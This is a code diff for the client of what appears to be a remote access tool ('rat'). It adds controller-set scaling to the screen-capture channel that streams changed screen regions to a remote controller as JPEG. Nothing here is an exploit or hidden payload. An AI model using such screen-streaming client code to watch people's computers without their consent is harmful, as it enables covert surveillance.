@@ -8,6 +8,8 @@ import (
 	"io"
 	"rat/client/screen"
 	"rat/imgdiff"
+
+	"github.com/disintegration/imaging"
 )
 
 type ScreenChannel struct {
@@ -24,6 +26,7 @@ type ScreenChannel struct {
 // reset reads new config from controller
 func (sc *ScreenChannel) reset(channel io.Reader) (err error) {
 	binary.Read(channel, binary.LittleEndian, &sc.Monitor)
+	binary.Read(channel, binary.LittleEndian, &sc.Scale)
 	err = binary.Read(channel, binary.LittleEndian, &sc.Handle)
 
 	return
@@ -53,10 +56,24 @@ func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Connection) error {
 			case <-c.die:
 				return
 			case chunk := <-cmp.C:
-				binary.Write(channel, binary.LittleEndian, int32(chunk.Bounds().Min.X))
-				binary.Write(channel, binary.LittleEndian, int32(chunk.Bounds().Min.Y))
-				binary.Write(channel, binary.LittleEndian, int32(chunk.Bounds().Max.X))
-				binary.Write(channel, binary.LittleEndian, int32(chunk.Bounds().Max.Y))
+				rect := chunk.Rect
+
+				if sc.Scale > 0 && sc.Scale < 1.0 {
+					width := float32(chunk.Rect.Dx()) * sc.Scale
+					height := float32(chunk.Rect.Dy()) * sc.Scale
+
+					nrgba := imaging.Resize(chunk, int(width), int(height), imaging.NearestNeighbor)
+					chunk = &image.RGBA{
+						Pix:    nrgba.Pix,
+						Stride: nrgba.Stride,
+						Rect:   nrgba.Rect,
+					}
+				}
+
+				binary.Write(channel, binary.LittleEndian, int32(rect.Min.X))
+				binary.Write(channel, binary.LittleEndian, int32(rect.Min.Y))
+				binary.Write(channel, binary.LittleEndian, int32(rect.Max.X))
+				binary.Write(channel, binary.LittleEndian, int32(rect.Max.Y))
 
 				var buf bytes.Buffer
 				err = jpeg.Encode(&buf, chunk, &jpeg.Options{
